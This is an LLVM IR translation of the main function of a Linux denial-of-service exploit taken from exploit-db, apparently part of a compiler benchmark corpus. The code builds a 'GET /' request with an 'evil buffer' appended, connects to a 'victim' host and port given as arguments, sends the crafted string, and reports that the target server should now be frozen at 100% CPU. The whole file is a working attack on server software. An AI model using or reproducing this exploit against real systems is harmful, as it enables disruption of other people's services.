; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_1196.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_1196.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i64 }

@.str = private unnamed_addr constant [29 x i8] c"# Making our evil buffer... \00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@EVIL = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"(done)\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [26 x i8] c"# error creating socket.\0A\00", align 1
@.str.5 = private unnamed_addr constant [43 x i8] c"# cant resolve the specified hostname: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c"# connecting to victim... \00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"(error)\0A# check again %s:%d\0A\00", align 1
@.str.8 = private unnamed_addr constant [36 x i8] c"(done)\0A# sending crafted string... \00", align 1
@.str.9 = private unnamed_addr constant [45 x i8] c"\0A# error while sending the crafted string.!\0A\00", align 1
@.str.10 = private unnamed_addr constant [62 x i8] c"(done)\0A# The server should be frozen now with 100% cpu usage.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [50 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = bitcast [50 x i8]* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %10, i8 0, i64 50, i1 false)
  %11 = bitcast i8* %10 to [50 x i8]*
  %12 = getelementptr inbounds [50 x i8], [50 x i8]* %11, i32 0, i32 0
  store i8 71, i8* %12, align 16
  %13 = getelementptr inbounds [50 x i8], [50 x i8]* %11, i32 0, i32 1
  store i8 69, i8* %13, align 1
  %14 = getelementptr inbounds [50 x i8], [50 x i8]* %11, i32 0, i32 2
  store i8 84, i8* %14, align 2
  %15 = getelementptr inbounds [50 x i8], [50 x i8]* %11, i32 0, i32 3
  store i8 32, i8* %15, align 1
  %16 = getelementptr inbounds [50 x i8], [50 x i8]* %11, i32 0, i32 4
  store i8 47, i8* %16, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 3
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @usage(i8* %22)
  br label %24

24:                                               ; preds = %19, %2
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  %26 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 5
  %27 = load i8*, i8** @EVIL, align 8
  %28 = call i32 @snprintf(i8* %26, i32 47, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %27)
  %29 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %30 = call i32 @strcat(i8* %29, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %32 = load i32, i32* @AF_INET, align 4
  %33 = load i32, i32* @SOCK_STREAM, align 4
  %34 = call i32 @socket(i32 %32, i32 %33, i32 0)
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %7, align 4
  %36 = icmp slt i32 %35, 0
  br i1 %36, label %37, label %39

37:                                               ; preds = %24
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  store i32 %38, i32* %3, align 4
  br label %99

39:                                               ; preds = %24
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call %struct.hostent* @gethostbyname(i8* %42)
  store %struct.hostent* %43, %struct.hostent** %9, align 8
  %44 = load %struct.hostent*, %struct.hostent** %9, align 8
  %45 = icmp eq %struct.hostent* %44, null
  br i1 %45, label %46, label %51

46:                                               ; preds = %39
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 1
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.5, i64 0, i64 0), i8* %49)
  store i32 %50, i32* %3, align 4
  br label %99

51:                                               ; preds = %39
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0))
  br label %53

53:                                               ; preds = %51
  %54 = load i32, i32* @AF_INET, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %54, i32* %55, align 4
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58)
  %60 = call i32 @htons(i32 %59)
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %60, i32* %61, align 4
  %62 = load %struct.hostent*, %struct.hostent** %9, align 8
  %63 = getelementptr inbounds %struct.hostent, %struct.hostent* %62, i32 0, i32 1
  %64 = load i64, i64* %63, align 8
  %65 = inttoptr i64 %64 to i8*
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %67 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %66, i32 0, i32 0
  %68 = bitcast i32* %67 to i8*
  %69 = load %struct.hostent*, %struct.hostent** %9, align 8
  %70 = getelementptr inbounds %struct.hostent, %struct.hostent* %69, i32 0, i32 0
  %71 = load i32, i32* %70, align 8
  %72 = call i32 @bcopy(i8* %65, i8* %68, i32 %71)
  %73 = load i32, i32* %7, align 4
  %74 = call i64 @connect(i32 %73, %struct.sockaddr_in* %8, i32 12)
  %75 = icmp slt i64 %74, 0
  br i1 %75, label %76, label %85

76:                                               ; preds = %53
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = load i8**, i8*** %5, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 2
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @atoi(i8* %82)
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0), i8* %79, i32 %83)
  store i32 %84, i32* %3, align 4
  br label %99

85:                                               ; preds = %53
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.8, i64 0, i64 0))
  %87 = load i32, i32* %7, align 4
  %88 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %89 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %90 = call i32 @strlen(i8* %89)
  %91 = call i32 @send(i32 %87, i8* %88, i32 %90, i32 0)
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %95

93:                                               ; preds = %85
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.9, i64 0, i64 0))
  store i32 %94, i32* %3, align 4
  br label %99

95:                                               ; preds = %85
  %96 = load i32, i32* %7, align 4
  %97 = call i32 @close(i32 %96)
  %98 = call i32 @puts(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.10, i64 0, i64 0))
  store i32 %98, i32* %3, align 4
  br label %99

99:                                               ; preds = %95, %93, %76, %46, %37
  %100 = load i32, i32* %3, align 4
  ret i32 %100
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @bcopy(i8*, i8*, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr_in*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @puts(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
